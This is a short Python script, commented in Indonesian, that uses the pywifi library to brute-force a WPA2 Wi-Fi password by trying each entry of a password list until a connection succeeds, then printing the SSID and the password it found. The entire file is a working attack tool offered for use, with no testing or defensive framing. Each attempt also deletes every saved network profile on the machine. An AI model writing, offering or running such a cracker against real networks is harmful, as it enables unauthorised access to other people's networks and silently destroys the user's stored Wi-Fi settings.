import pywifi
from pywifi import const
import time

def connect_wifi(ssid, password):
    wifi = pywifi.PyWiFi()  # Inisialisasi objek PyWiFi
    iface = wifi.interfaces()[0]  # Mendapatkan antarmuka WiFi yang tersedia
    iface.disconnect()  # Memutuskan koneksi WiFi yang aktif

    # Membuat objek profil WiFi
    profile = pywifi.Profile()
    profile.ssid = ssid  # Mengatur nama SSID (nama WiFi)
    profile.auth = const.AUTH_ALG_OPEN  # Mengatur metode otentikasi
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # Mengatur tipe enkripsi
    profile.cipher = const.CIPHER_TYPE_CCMP  # Mengatur tipe cipher
    profile.key = password  # Mengatur kata sandi WiFi

    iface.remove_all_network_profiles()  # Menghapus semua profil WiFi yang ada
    tmp_profile = iface.add_network_profile(profile)  # Menambahkan profil WiFi yang baru

    iface.connect(tmp_profile)  # Mencoba terhubung ke WiFi

    # Menunggu beberapa saat untuk melihat apakah terhubung berhasil
    time.sleep(5)
    if iface.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False

def crack_wifi_password(ssid, pwd_list):
    for password in pwd_list:
        print(f"Mencoba kata sandi: {password}")
        if connect_wifi(ssid, password):
            print("Kata sandi WiFi ditemukan!")
            print(f"SSID: {ssid}")
            print(f"Kata Sandi: {password}")
            break
        else:
            print("Gagal terhubung dengan kata sandi tersebut.")
        print()

